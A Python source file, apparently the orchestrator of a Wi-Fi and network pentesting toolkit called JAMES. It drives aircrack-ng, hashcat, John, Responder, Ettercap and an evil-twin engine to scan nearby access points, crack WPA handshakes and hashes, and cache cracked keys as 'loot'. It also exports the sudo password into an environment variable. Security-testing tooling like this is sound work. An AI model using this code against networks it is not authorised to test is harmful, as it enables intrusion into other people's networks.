"""
JAMES Orchestrator.

Central coordinator that connects tool wrappers, the execution layer,
skill definitions, and the GUI. Maintains a task log and emits
signals the GUI can subscribe to.
"""

import glob
import json
import logging
import os
import re
import subprocess
import time
import shlex
from datetime import datetime
from pathlib import Path
import keyring
from typing import Optional

from james.layers.native import NativeLayer
from james.core.net_guard import NetworkGuard
from james.tools.parrot import (
    AircrackSuite,
    Hashcat,
    Hcxtools,
    WPA3Tools,
    Nmap,
    John,
    TheHarvester,
    Wafw00f,
    Ettercap,
    Masscan,
    Reaver,
    Responder,
    Sslscan,
    IoTTools,
)
from james.tools.pineap import PineAP

logger = logging.getLogger(__name__)

SKILLS_DIR = Path(__file__).resolve().parent.parent / "skills"


class TaskEntry:
    """Single entry in the task log."""

    def __init__(self, action: str, tool: str, params: dict):
        self.timestamp = datetime.now().isoformat()
        self.action = action
        self.tool = tool
        self.params = params
        self.result: Optional[dict] = None
        self.status = "pending"  # pending | running | done | error

    def as_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "action": self.action,
            "tool": self.tool,
            "params": self.params,
            "result": self.result,
            "status": self.status,
        }


# Pre-compiled regex for skill template variable substitution
_TEMPLATE_VAR_RE = re.compile(r"\{\{(\w+)\}\}")


class Orchestrator:
    """
    Top-level coordinator for JAMES.

    Attributes:
        layer:    NativeLayer instance
        nmap:     Nmap wrapper
        aircrack: AircrackSuite wrapper
        hashcat:  Hashcat wrapper
        john:     John wrapper
        task_log: ordered list of TaskEntry objects (capped at MAX_LOG)
    """

    MAX_LOG = 500  # prevent unbounded memory growth

    # Common wordlist paths for auto-detection (preferred order)
    _WORDLISTS = [
        str(Path.home() / "Desktop" / "rockyou.txt"),
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        str(Path.home() / "Desktop" / "wordlists" / "rockyou.txt"),
    ]

    # Project-local wordlist directory
    WORDLIST_DIR = Path(__file__).resolve().parent.parent.parent / "wordlists"

    LOOT_DIR = Path.home() / ".james" / "loot"

    # Cache for wordlist line counts (key: "path_mtime", value: line count)
    _wordlist_cache: dict[str, int] = {}

    def __init__(self):
        self.layer = NativeLayer()
        # ── Core tool wrappers ──────────────────────────────────────
        self.aircrack = AircrackSuite(self.layer)
        self.hashcat = Hashcat(self.layer)
        self.hcxtools = Hcxtools(self.layer)
        self.wpa3 = WPA3Tools(self.layer)
        # ── New tool wrappers ───────────────────────────────────────
        self.nmap = Nmap(self.layer)
        self.john = John(self.layer)
        self.harvester = TheHarvester(self.layer)
        self.wafdetect = Wafw00f(self.layer)
        self.ettercap = Ettercap(self.layer)
        self.masscan = Masscan(self.layer)
        self.reaver = Reaver(self.layer)
        self.responder = Responder(self.layer)
        self.sslscan = Sslscan(self.layer)
        self.iot = IoTTools(self.layer)
        # ── Task log ────────────────────────────────────────────────
        self.task_log: list[TaskEntry] = []

        # callbacks the GUI can set to receive updates
        self.on_task_update: Optional[callable] = None
        self.on_print: Optional[callable] = None
        # progress callback: (phase_name: str, phase_num: int, total_phases: int)
        self.on_progress: Optional[callable] = None

        # Result cache — persists cracked keys, scan summaries across sessions
        self.loot_cache: dict = self._load_loot()

        # Network self-protection — prevents severing own connection
        self.net_guard = NetworkGuard(enabled=True)

        # PineAP — WiFi Pineapple-style attack engine
        self.pineap = PineAP(self.layer)

        # Auto-load sudo password from saved settings
        self._load_sudo_from_settings()

    def _load_sudo_from_settings(self):
        """Load saved sudo password from keyring into NativeLayer."""
        try:
            sudo_pass = keyring.get_password("james", "sudo_password")

            # Fallback for backwards compatibility
            if not sudo_pass:
                settings_file = Path.home() / ".config" / "james" / "settings.json"
                if settings_file.exists():
                    settings = json.loads(settings_file.read_text())
                    sudo_pass = settings.get("sudo_password")
                    if sudo_pass:
                        try:
                            keyring.set_password("james", "sudo_password", sudo_pass)
                            # Remove plaintext password
                            settings.pop("sudo_password", None)
                            settings_file.write_text(json.dumps(settings, indent=2))
                        except Exception as e:
                            logger.warning("Could not migrate sudo password to keyring: %s", e)

            if sudo_pass:
                self.layer.set_sudo_password(sudo_pass)
                os.environ["JAMES_SUDO_PASS"] = sudo_pass
                logger.info("Sudo password loaded securely")
        except Exception as e:
            logger.warning("Could not load sudo settings: %s", e)

    def _load_loot(self) -> dict:
        """Load cached loot (cracked keys, etc.) from disk."""
        loot_file = self.LOOT_DIR / "results.json"
        if loot_file.exists():
            try:
                with open(loot_file, "r") as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError) as e:
                logger.warning("Failed to load loot cache from %s: %s", loot_file, e)
        return {"cracked_keys": {}, "scan_history": [], "captured_hashes": []}

    def _save_loot(self):
        """Persist loot cache to disk."""
        self.LOOT_DIR.mkdir(parents=True, exist_ok=True)
        loot_file = self.LOOT_DIR / "results.json"
        try:
            with open(loot_file, "w") as f:
                json.dump(self.loot_cache, f, indent=2, default=str)
        except IOError as e:
            logger.warning("Failed to save loot: %s", e)

    def cache_cracked_key(
        self,
        bssid_or_id: str,
        key: str,
        method: str = "unknown",
        essid: str = "",
    ):
        """Store a cracked credential in the persistent loot cache."""
        self.loot_cache["cracked_keys"][bssid_or_id] = {
            "key": key,
            "method": method,
            "essid": essid,
            "cracked_at": datetime.now().isoformat(),
        }
        self._save_loot()
        self._print(f"[LOOT] Cached key for {essid or bssid_or_id}: {key}")

    def get_cached_key(self, bssid_or_id: str) -> Optional[str]:
        """Check if we already cracked this target."""
        entry = self.loot_cache.get("cracked_keys", {}).get(bssid_or_id)
        return entry["key"] if entry else None

    def get_loot_summary(self) -> dict:
        """Return summary of all cached loot."""
        keys = self.loot_cache.get("cracked_keys", {})
        return {
            "cracked_count": len(keys),
            "keys": [
                {
                    "id": k,
                    "essid": v.get("essid", ""),
                    "method": v.get("method", ""),
                    "key": v["key"],
                    "when": v.get("cracked_at", ""),
                }
                for k, v in keys.items()
            ],
        }

    # ── auto wordlist detection ─────────────────────────────────

    def find_wordlist(self, category: str = "password") -> Optional[str]:
        """Auto-detect the best available wordlist on the system.

        Categories: 'password' (default), 'wifi', 'web', 'usernames', 'subdomains'
        """
        # Category-specific picks from our generated lists
        category_map = {
            "wifi": [
                "wifi-mega-wpa.txt",
                "wifi-custom-patterns.txt",
                "wifi-wpa-top4800.txt",
            ],
            "web": [
                "web-raft-large.txt",
                "web-common.txt",
                "web-custom-paths.txt",
            ],
            "usernames": ["usernames-names.txt", "usernames-short.txt"],
            "subdomains": ["subdomains-top5000.txt", "subdomains-custom.txt"],
        }
        if category in category_map:
            for name in category_map[category]:
                path = self.WORDLIST_DIR / name
                if path.exists():
                    return str(path)

        # Default: try the big password lists
        for wl in self._WORDLISTS:
            if Path(wl).exists():
                return wl
        # Try our project wordlists
        for name in [
            "top-10k-passwords.txt",
            "rockyou-75.txt",
            "worst-500.txt",
        ]:
            path = self.WORDLIST_DIR / name
            if path.exists():
                return str(path)
        # Fallback: search common directories
        result = self.layer.run(
            "find /usr/share/wordlists -name 'rockyou*' -type f 2>/dev/null | head -1",
            timeout=5,
        )
        if result.stdout.strip():
            return result.stdout.strip()
        return None

    def list_wordlists(self) -> list[dict]:
        """Return an inventory of all available wordlists with metadata."""
        inventory = []

        # System wordlists
        system_paths = [
            ("/usr/share/wordlists/rockyou.txt", "password", "RockYou (full)"),
            ("/usr/share/wordlists/darkc0de.txt", "password", "Darkc0de"),
            (
                "/usr/share/wordlists/probable-v2-wpa-top4800.txt",
                "wifi",
                "WPA Top 4800 (system)",
            ),
        ]
        for path, cat, label in system_paths:
            p = Path(path)
            if p.exists():
                try:
                    mtime = p.stat().st_mtime
                except Exception:
                    mtime = 0
                cache_key = f"{p}_{mtime}"

                if cache_key in self.__class__._wordlist_cache:
                    lines = self.__class__._wordlist_cache[cache_key]
                else:
                    try:
                        lines = max(1, p.stat().st_size // 10)
                    except Exception as e:
                        logger.debug("Could not estimate lines in %s: %s", path, e)
                        lines = 0
                    self.__class__._wordlist_cache[cache_key] = lines

                inventory.append(
                    {
                        "path": str(p),
                        "name": label,
                        "category": cat,
                        "lines": lines,
                        "size_mb": round(p.stat().st_size / 1048576, 1),
                    }
                )

        # Project wordlists
        if self.WORDLIST_DIR.exists():
            for f in sorted(self.WORDLIST_DIR.glob("*.txt")):
                if f.stat().st_size < 2:
                    continue  # skip empty files

                try:
                    mtime = f.stat().st_mtime
                except Exception:
                    mtime = 0
                cache_key = f"{f}_{mtime}"

                if cache_key in self.__class__._wordlist_cache:
                    lines = self.__class__._wordlist_cache[cache_key]
                else:
                    try:
                        lines = max(1, f.stat().st_size // 10)
                    except Exception:
                        lines = 0
                    self.__class__._wordlist_cache[cache_key] = lines

                name = f.stem
                if "wifi" in name or "wpa" in name:
                    cat = "wifi"
                elif "web" in name or "raft" in name:
                    cat = "web"
                elif "user" in name:
                    cat = "usernames"
                elif "subdomain" in name or "dns" in name:
                    cat = "subdomains"
                elif "default" in name:
                    cat = "defaults"
                else:
                    cat = "password"
                inventory.append(
                    {
                        "path": str(f),
                        "name": name,
                        "category": cat,
                        "lines": lines,
                        "size_mb": round(f.stat().st_size / 1048576, 1),
                    }
                )

        return inventory

    def _print(self, msg: str):
        logger.info(msg)
        if self.on_print:
            self.on_print(msg)

    def _emit_progress(self, phase: str, num: int, total: int):
        """Emit progress update if a listener is attached."""
        if self.on_progress:
            try:
                self.on_progress(phase, num, total)
            except Exception as e:
                logger.debug("Progress callback error: %s", e)

    # ── monitor interface helper ─────────────────────────────────

    def _mon_iface(self, interface: str) -> str:
        """Derive the monitor-mode interface name from a managed interface.

        If the interface already ends with 'mon', returns it as-is.
        Otherwise returns '<interface>mon' (the airmon-ng default).
        """
        if interface.endswith("mon"):
            return interface
        return f"{interface}mon"

    # ── prerequisite auto-resolution ────────────────────────────

    def _is_monitor_mode(self, interface: str) -> bool:
        """Check if an interface is currently in Monitor mode."""
        ifaces = self.aircrack.list_interfaces()
        for iface in ifaces:
            if iface["interface"] == interface:
                return iface.get("mode", "").lower() == "monitor"
        return False

    def ensure_monitor_mode(self, interface: str) -> str:
        """
        Guarantee the given interface is in monitor mode.
        If it's in Managed mode, automatically enable monitor.
        Returns the monitor-mode interface name.

        Prerequisite chain: check_kill → enable_monitor
        """
        mon_iface = self._mon_iface(interface)

        # Already a monitor interface that exists?
        if self._is_monitor_mode(mon_iface):
            self._print(f"[PREREQ] {mon_iface} already in Monitor mode ✓")
            return mon_iface

        # Base interface is already in monitor?
        if self._is_monitor_mode(interface):
            self._print(f"[PREREQ] {interface} already in Monitor mode ✓")
            return interface

        # Need to enable monitor mode
        self._print(f"[PREREQ] {interface} is in Managed mode — auto-enabling Monitor…")
        result = self.start_monitor(interface)
        if result.get("error") or result.get("blocked"):
            raise RuntimeError(
                f"Failed to auto-enable monitor on {interface}: "
                f"{result.get('error', 'unknown error')}"
            )

        # check if airmon-ng renamed the interface
        stdout = result.get("stdout", "")
        import re

        m = re.search(r"enabled on \[phy\d+\]([^\)\s]+)", stdout)
        if m:
            mon_iface = m.group(1)

        self._print(f"[PREREQ] Monitor mode enabled → {mon_iface} ✓")
        return mon_iface

    def ensure_wordlist(self, wordlist: str) -> str:
        """
        Guarantee the wordlist path exists.
        If it doesn't, scan common locations and return the first found.
        """
        if wordlist and Path(wordlist).exists():
            return wordlist

        self._print(
            f"[PREREQ] Wordlist not found at {wordlist} — scanning alternatives…"
        )
        for candidate in self._WORDLISTS:
            if Path(candidate).exists():
                self._print(f"[PREREQ] Found wordlist → {candidate} ✓")
                return candidate

        # Check project wordlist directory
        if self.WORDLIST_DIR.exists():
            for f in self.WORDLIST_DIR.glob("*.txt"):
                self._print(f"[PREREQ] Found wordlist → {f} ✓")
                return str(f)

        self._print("[PREREQ] ⚠ No wordlist found — proceeding with original path")
        return wordlist

    def ensure_wireless_interface(self, interface: str = "") -> str:
        """
        Guarantee a valid wireless interface is available.
        If none specified, auto-detect the first available wireless interface.
        """
        if interface:
            return interface

        self._print("[PREREQ] No interface specified — auto-detecting…")
        ifaces = self.aircrack.list_interfaces()
        if not ifaces:
            raise RuntimeError(
                "No wireless interfaces detected. Plug in a Wi-Fi adapter."
            )
        # Prefer one already in Monitor mode
        for iface in ifaces:
            if iface.get("mode", "").lower() == "monitor":
                self._print(
                    f"[PREREQ] Using monitor interface → {iface['interface']} ✓"
                )
                return iface["interface"]
        # Otherwise use the first managed interface
        selected = ifaces[0]["interface"]
        self._print(f"[PREREQ] Auto-selected interface → {selected} ✓")
        return selected

    def ensure_capture_file(self, capture: str) -> str:
        """Verify the capture file exists."""
        if capture and Path(capture).exists():
            return capture
        if not capture:
            raise RuntimeError("No capture file specified.")
        raise RuntimeError(f"Capture file not found: {capture}")

    # ── convenience actions ─────────────────────────────────────

    def system_check(self) -> dict:
        """Verify that required tools are installed (batched for speed)."""
        tools = [
            "nmap",
            "masscan",
            "aircrack-ng",
            "airmon-ng",
            "airodump-ng",
            "aireplay-ng",
            "hashcat",
            "john",
            "iwconfig",
            "hydra",
            "medusa",
            "ncrack",
            "sqlmap",
            "nikto",
            "gobuster",
            "whatweb",
            "wafw00f",
            "sslscan",
            "theHarvester",
            "responder",
            "ettercap",
            "msfconsole",
            "netcat",
            "socat",
            "tcpdump",
            "tshark",
            "reaver",
            "bully",
            "mdk4",
            "wifite",
            "hcxdumptool",
            "enum4linux",
            "smbclient",
            "arp-scan",
            "netdiscover",
            "hostapd",
            "dnsmasq",
            "hcxpcapngtool",
            "dig",
            "whois",
            "dnsrecon",
        ]
        # Single shell command: print each tool that IS found
        check_cmds = " ".join(
            f"which {t} 2>/dev/null && echo FOUND:{t};" for t in tools
        )
        result = self.layer.run(check_cmds, timeout=15)
        found = set()
        for line in result.stdout.splitlines():
            if line.startswith("FOUND:"):
                found.add(line[6:])
        return {t: (t in found) for t in tools}

    # ── kill JAMES ──────────────────────────────────────────────

    def kill_james(self) -> dict:
        """
        Emergency stop — kill every tool JAMES may have spawned,
        restore all wireless interfaces to managed mode, flush
        iptables, restart NetworkManager, and clean temp files.
        Returns a summary dict of what was cleaned up.
        """
        summary = {"killed": [], "interfaces_restored": [], "errors": []}

        self._print("━" * 50)
        self._print("🛑 KILL JAMES — Shutting everything down...")
        self._print("━" * 50)
        self._emit_progress("Killing processes", 1, 5)

        # ── 1. Kill all known pentesting processes ──────────────
        kill_targets = [
            "airodump-ng",
            "aireplay-ng",
            "airmon-ng",
            "aircrack-ng",
            "hcxdumptool",
            "hashcat",
            "john",
            "nmap",
            "masscan",
            "reaver",
            "bully",
            "mdk4",
            "wifite",
            "responder",
            "ettercap",
            "hostapd",
            "dnsmasq",
            "hydra",
            "medusa",
            "ncrack",
            "sqlmap",
            "nikto",
            "gobuster",
            "whatweb",
            "tcpdump",
            "tshark",
        ]

        self._print("\n[KILL] Phase 1/5 — Killing tool processes...")
        # First kill all tracked background processes from the registry
        registry_killed = self.layer.kill_all_background()
        if registry_killed:
            self._print(f"  ✕ Killed {registry_killed} tracked background process(es)")
            summary["killed"].append(f"{registry_killed} tracked processes")

        # Then broadcast-kill any strays not in the registry
        pkill_cmd = "; ".join(
            f"pkill -f {p} 2>/dev/null && echo KILLED:{p}" for p in kill_targets
        )
        killall_cmd = "; ".join(f"killall {p} 2>/dev/null" for p in kill_targets)
        result = self.layer.run(pkill_cmd, sudo=True, timeout=10)
        self.layer.run(killall_cmd, sudo=True, timeout=10)

        for line in result.stdout.splitlines():
            if line.startswith("KILLED:"):
                name = line[7:]
                summary["killed"].append(name)
                self._print(f"  ✕ Killed: {name}")

        # Small delay for processes to die
        time.sleep(1)

        # ── 2. Restore all wireless interfaces to managed mode ──
        self._print("\n[KILL] Phase 2/5 — Restoring wireless interfaces...")
        self._emit_progress("Restoring interfaces", 2, 5)
        try:
            ifaces = self.aircrack.list_interfaces()
            for iface in ifaces:
                name = iface["interface"]
                mode = iface.get("mode", "").lower()
                if mode == "monitor" or name.endswith("mon"):
                    self._print(f"  ↩ Restoring {name} to managed mode...")
                    self.layer.run(f"airmon-ng stop {name}", sudo=True, timeout=10)
                    summary["interfaces_restored"].append(name)

            # Also brute-force stop any common monitor interfaces (batched)
            self.layer.run(
                "airmon-ng stop wlan0mon 2>/dev/null; "
                "airmon-ng stop wlan1mon 2>/dev/null; "
                "airmon-ng stop mon0 2>/dev/null; "
                "airmon-ng stop mon1 2>/dev/null",
                sudo=True,
                timeout=15,
            )

            # Set interfaces back to up + managed via iw/ifconfig
            ifaces_after = self.aircrack.list_interfaces()
            for iface in ifaces_after:
                name = iface["interface"]
                self.layer.run(
                    f"ifconfig {name} down 2>/dev/null && "
                    f"iwconfig {name} mode managed 2>/dev/null && "
                    f"ifconfig {name} up 2>/dev/null",
                    sudo=True,
                    timeout=8,
                )
                self._print(f"  ✓ {name} → managed mode, UP")
        except Exception as e:
            summary["errors"].append(f"Interface restore: {e}")
            self._print(f"  [!] Interface restore error: {e}")

        # ── 3. Flush iptables rules (evil twin / MITM cleanup) ──
        self._print("\n[KILL] Phase 3/5 — Flushing iptables & routing...")
        self._emit_progress("Flushing iptables", 3, 5)
        self.layer.run(
            "iptables --flush && iptables --table nat --flush && "
            "iptables --table mangle --flush && iptables -P FORWARD DROP && "
            "echo 0 > /proc/sys/net/ipv4/ip_forward",
            sudo=True,
            timeout=10,
        )
        self._print("  ✓ iptables flushed, IP forwarding disabled")

        # ── 4. Restart NetworkManager to reconnect Wi-Fi ────────
        self._print("\n[KILL] Phase 4/5 — Restarting NetworkManager...")
        self._emit_progress("Restarting NetworkManager", 4, 5)
        nm_result = self.layer.run(
            "systemctl restart NetworkManager", sudo=True, timeout=15
        )
        if nm_result.success:
            self._print("  ✓ NetworkManager restarted — Wi-Fi should reconnect shortly")
        else:
            # Fallback: try service command
            self.layer.run(
                "service network-manager restart 2>/dev/null",
                sudo=True,
                timeout=10,
            )
            self._print("  ↻ Attempted NetworkManager restart via service command")

        # Also try wpa_supplicant restart
        self.layer.run(
            "systemctl restart wpa_supplicant 2>/dev/null",
            sudo=True,
            timeout=10,
        )

        # ── 5. Clean up temp files ──────────────────────────────
        self._print("\n[KILL] Phase 5/5 — Cleaning temp files...")
        self._emit_progress("Cleaning temp files", 5, 5)
        self.layer.run("rm -f /tmp/james_* 2>/dev/null", timeout=5)
        self._print("  ✓ Temp files cleaned")

        # ── Summary ─────────────────────────────────────────────
        self._print("\n" + "━" * 50)
        self._print(f"🛑 KILL JAMES Complete")
        self._print(f"  Processes killed:     {len(summary['killed'])}")
        self._print(f"  Interfaces restored:  {len(summary['interfaces_restored'])}")
        if summary["errors"]:
            self._print(f"  Errors:               {len(summary['errors'])}")

        # Verify connectivity
        self._print("\n  ⏳ Checking internet connectivity...")
        time.sleep(5)
        ping = self.layer.run("ping -c 1 -W 3 8.8.8.8", timeout=8)
        if ping.success:
            self._print("  ✓ Internet connectivity verified")
            summary["connectivity"] = True
        else:
            self._print("  ⚠ No internet yet — Wi-Fi may take 10-20s to reconnect")
            self._print("  If stuck, manually reconnect from the network tray.")
            summary["connectivity"] = False

        self._print("━" * 50)

        return summary

    # ── live AP scanner ─────────────────────────────────────────

    def scan_nearby_aps(self, interface: str, duration: int = 10) -> dict:
        """
        Quick scan for nearby Wi-Fi access points.
        Returns structured AP list sorted by signal strength.
        Auto-enables monitor mode if not already active.
        """
        entry = self._log("ap_scan", "airodump-ng", {"interface": interface})

        # Auto-resolve prerequisites
        interface = self.ensure_wireless_interface(interface)
        mon_iface = self.ensure_monitor_mode(interface)

        prefix = "/tmp/james_apscan"
        self.layer.run(f"rm -f {shlex.quote(prefix)}*")
        proc = self.aircrack.start_airodump(
            mon_iface,
            write_prefix=prefix,
        )
        time.sleep(duration)
        self.layer.kill_background(proc)

        # Find the CSV file — airodump may name it -01.csv, -02.csv, etc.
        csv_files = sorted(glob.glob(f"{prefix}*.csv"))
        aps = []
        if csv_files:
            try:
                with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if content.strip():
                        parsed = self.aircrack.parse_airodump_csv(content)
                        aps = parsed.get("aps", [])
                        # Filter out invalid entries (blank BSSIDs, power == -1)
                        aps = [
                            ap
                            for ap in aps
                            if ap.get("bssid", "").count(":") == 5
                            and ap.get("power", -1) != -1
                        ]
                        aps.sort(key=lambda x: x.get("power", -100), reverse=True)
            except Exception as e:
                self._print(f"[AP SCAN] Failed to parse CSV: {e}")
                logger.exception("Failed to parse airodump CSV file: %s", csv_files[0])
        else:
            self._print(
                "[AP SCAN] No CSV output from airodump-ng — check that the interface supports monitor mode and is not blocked."
            )
            logger.error("No airodump-ng CSV files found matching %s*.csv", prefix)

        # Restore managed mode if we enabled monitor ourselves
        if not interface.endswith("mon"):
            self.aircrack.disable_monitor(mon_iface)

        result = {"aps": aps, "count": len(aps), "duration": duration}
        self._finish(entry, result)
        return result

    def connect_open_wifi(self) -> dict:
        """Scan and connect to the strongest open Wi-Fi network."""
        entry = self._log("connect_open", "nmcli", {})
        self._print("━" * 50)
        self._print("🌐 Connecting to Open Wi-Fi")
        self._print("━" * 50)

        self._print("[WIFI] Rescanning for nearby networks...")
        self.layer.run("nmcli dev wifi rescan", timeout=10)
        time.sleep(3)

        result = self.layer.run(
            "nmcli -t -e no -f BSSID,SSID,SECURITY,SIGNAL dev wifi list",
            timeout=10,
        )
        open_aps = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if not line or len(line) < 18:
                continue

            bssid = line[:17]
            rest = line[18:]
            parts = rest.rsplit(":", 2)
            if len(parts) != 3:
                continue

            ssid, security, signal_str = parts
            if not security.strip() or security.strip() == "--":
                try:
                    open_aps.append((bssid, ssid, int(signal_str)))
                except ValueError:
                    pass

        if not open_aps:
            msg = "[WIFI] No open Wi-Fi networks found nearby."
            self._print(msg)
            res = {"success": False, "error": "No open networks found"}
            self._finish(entry, res)
            return res

        open_aps.sort(key=lambda x: x[2], reverse=True)
        best_bssid, best_ssid, best_sig = open_aps[0]

        self._print(
            f"[WIFI] Found open network '{best_ssid}' ({best_bssid}) at {best_sig}% signal."
        )
        self._print(f"[WIFI] Attempting connection to {best_bssid}...")

        conn = self.layer.run(
            f"nmcli dev wifi connect '{best_bssid}'", sudo=True, timeout=30
        )
        if conn.success or "successfully activated" in conn.stdout:
            msg = f"✅ Connected to open Wi-Fi: {best_ssid}"
            self._print(msg)
            res = {
                "success": True,
                "bssid": best_bssid,
                "ssid": best_ssid,
                "message": msg,
            }
        else:
            msg = f"❌ Failed to connect to {best_ssid}: {conn.stderr.strip() or conn.stdout.strip()}"
            self._print(msg)
            res = {
                "success": False,
                "error": msg,
                "bssid": best_bssid,
                "ssid": best_ssid,
            }

        self._finish(entry, res)
        return res

    def quick_recon(self, target: str) -> dict:
        """Run a fast nmap scan and log it."""
        entry = self._log("quick_recon", "nmap", {"target": target})
        result = self.nmap.quick_scan(target)
        self._finish(entry, result)
        return result

    def full_scan(self, target: str, ports: str = "1-65535") -> dict:
        entry = self._log("full_scan", "nmap", {"target": target, "ports": ports})
        result = self.nmap.scan(
            target, ports=ports, flags="-sV -sC", sudo=True, timeout=600
        )
        self._finish(entry, result)
        return result

    def wifi_interfaces(self) -> list[dict]:
        entry = self._log("wifi_interfaces", "aircrack", {})
        ifaces = self.aircrack.list_interfaces()
        self._finish(entry, {"interfaces": ifaces})
        return ifaces

    def audit_wifi_hardware(self) -> dict:
        """Audit connected WiFi adapters for pentesting compatibility."""
        results = {}

        # 1. Parse airmon-ng to get drivers and chipsets
        airmon = self.layer.run("airmon-ng", sudo=True, timeout=5)
        adapters = {}
        for line in airmon.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 3 and line.startswith("phy"):
                phy = parts[0]
                iface = parts[1]
                driver = parts[2]
                chipset = " ".join(parts[3:]) if len(parts) > 3 else "Unknown"
                adapters[iface] = {
                    "phy": phy,
                    "driver": driver,
                    "chipset": chipset,
                }

        # 2. Parse iw list for supported modes
        iw_out = self.layer.run("iw list", timeout=5)
        phy_modes = {}
        current_phy = None
        in_modes = False
        for line in iw_out.stdout.splitlines():
            if line.startswith("Wiphy "):
                current_phy = line.split()[1]
                phy_modes[current_phy] = []
                in_modes = False
            elif "Supported interface modes:" in line:
                in_modes = True
            elif in_modes and line.strip().startswith("* "):
                phy_modes[current_phy].append(line.strip()[2:].strip())
            elif in_modes and not line.startswith("\t") and not line.startswith(" "):
                in_modes = False

        # 3. Compile report
        for iface_info in self.wifi_interfaces():
            iface = iface_info["interface"]
            adapter = adapters.get(iface, {})
            driver = adapter.get("driver", "unknown")
            chipset = adapter.get("chipset", "Unknown Chipset")
            phy = adapter.get("phy", "")

            modes = phy_modes.get(phy, [])
            monitor_supported = "monitor" in modes

            if driver in [
                "ath9k",
                "ath9k_htc",
                "rt2800usb",
                "rt73usb",
                "rtl8187",
                "mt7601u",
                "8812au",
                "rtl8812au",
                "88XXau",
                "8814au",
                "rtl88XXau",
            ]:
                score = "green"
                reason = "Driver natively supports monitor mode and packet injection perfectly."
            elif driver in [
                "rtw88_8822bu",
                "rtw88_8822ce",
                "rtw89_8852ae",
                "rtw89_8852bu",
                "rtl8821ce",
            ]:
                score = "orange"
                reason = "Driver supports monitor mode but packet injection can be unstable or crash under load."
            elif driver in ["iwlwifi", "wl", "brcmfmac"]:
                score = "red"
                reason = "Driver is known to fail at packet injection, or monitor mode is fundamentally broken/unsupported."
            else:
                score = "orange" if monitor_supported else "red"
                reason = (
                    "Unknown driver."
                    if monitor_supported
                    else "Driver does not advertise monitor mode support."
                )

            if not monitor_supported and score != "red":
                score = "red"
                reason = "Hardware does not advertise 'monitor' in supported interface modes."

            results[iface] = {
                "driver": driver,
                "chipset": chipset,
                "monitor_supported": monitor_supported,
                "score": score,
                "reason": reason,
            }

        return results

    def start_monitor(self, interface: str) -> dict:
        # Network self-protection check
        safe, reason = self.net_guard.check_monitor_safe(interface)
        if not safe:
            self._print(reason)
            return {"error": reason, "blocked": True}

        entry = self._log("start_monitor", "aircrack", {"interface": interface})

        # Warn if check_kill will disrupt Wi-Fi
        _, ck_warning = self.net_guard.check_check_kill_safe()
        if ck_warning:
            self._print(ck_warning)

        self.aircrack.check_kill()
        result = self.aircrack.enable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def stop_monitor(self, interface: str) -> dict:
        entry = self._log("stop_monitor", "aircrack", {"interface": interface})
        result = self.aircrack.disable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def crack_handshake(self, capture: str, wordlist: str, bssid: str = None) -> dict:
        entry = self._log(
            "crack_handshake",
            "aircrack",
            {"capture": capture, "wordlist": wordlist, "bssid": bssid},
        )
        result = self.aircrack.crack_wpa(capture, wordlist, bssid=bssid)
        if result.get("found"):
            self.cache_cracked_key(
                bssid or capture, result["key"], method="aircrack", essid=""
            )
        self._finish(entry, result)
        return result

    def crack_hash(self, hash_file: str, wordlist: str, mode: int = 0) -> dict:
        """Crack hash with auto-rules enabled for better success rate."""
        entry = self._log(
            "crack_hash",
            "hashcat",
            {"hash_file": hash_file, "wordlist": wordlist, "mode": mode},
        )
        result = self.hashcat.crack(
            hash_file, wordlist, hash_mode=mode, auto_rules=True
        )
        if result.get("found"):
            for k in result.get("cracked_keys", []):
                self.cache_cracked_key(k["hash"][:32], k["plain"], method="hashcat")
        self._finish(entry, result)
        return result

    def smart_crack(self, hash_file: str, wordlist: str, mode: int = 0) -> dict:
        """
        Smart cascading crack: hashcat stages → john fallback.
        Tries increasingly aggressive strategies until keys are found.
        Auto-resolves prerequisites before starting.
        """
        # Auto-resolve prerequisites
        wordlist = self.ensure_wordlist(wordlist)

        self._print("━" * 50)
        self._print("🔓 SMART CRACK — Cascading Multi-Engine Attack")
        self._print("━" * 50)

        entry = self._log(
            "smart_crack",
            "hashcat+john",
            {"hash_file": hash_file, "wordlist": wordlist, "mode": mode},
        )

        # Stage 1: Hashcat cascading (straight → best64 → rockyou-30000)
        self._print("\n[STAGE 1/2] Hashcat cascading (wordlist → rules)...")
        self._emit_progress("Hashcat cascading", 1, 2)
        hc_result = self.hashcat.crack_cascading(
            hash_file, wordlist, hash_mode=mode, timeout_per_stage=300
        )
        if hc_result.get("found"):
            self._print(f"  🔑 Hashcat cracked {hc_result['total_cracked']} key(s)!")
            for k in hc_result.get("cracked_keys", []):
                self._print(f"    {k['hash'][:32]}… → {k['plain']}")
                self.cache_cracked_key(
                    k["hash"][:32], k["plain"], method="hashcat-cascading"
                )
            self._finish(entry, hc_result)
            return hc_result

        # Stage 2: John the Ripper fallback
        self._print("\n[STAGE 2/2] John the Ripper fallback...")
        self._emit_progress("John fallback", 2, 2)
        john_result = self.john.crack(hash_file, wordlist=wordlist, timeout=300)

        # Check john --show for results
        if john_result.get("success"):
            show = self.john.show(hash_file)
            if show["output"].strip():
                cracked = []
                for line in show["output"].splitlines():
                    if ":" in line and "password hashes cracked" not in line:
                        parts = line.split(":", 1)
                        if len(parts) == 2 and parts[1].strip():
                            cracked.append(
                                {"hash": parts[0], "plain": parts[1].strip()}
                            )
                            self.cache_cracked_key(
                                parts[0][:32], parts[1].strip(), method="john"
                            )
                if cracked:
                    self._print(f"  🔑 John cracked {len(cracked)} key(s)!")
                    result = {
                        "success": True,
                        "found": True,
                        "cracked_keys": cracked,
                        "engine": "john",
                    }
                    self._finish(entry, result)
                    return result

        self._print("\n🔒 All stages exhausted — key not in wordlist.")
        result = {
            "success": False,
            "found": False,
            "cracked_keys": [],
            "stages_tried": [
                "hashcat-straight",
                "hashcat-best64",
                "hashcat-rockyou30k",
                "john",
            ],
        }
        self._finish(entry, result)
        return result

    def crack_wpa_smart(
        self, capture: str, wordlist: str, bssid: str = None, ssid: str = None
    ) -> dict:
        """
        Smart WPA crack with enhanced WiFi-specific pipeline:
          1. SSID-targeted wordlist (if SSID known)
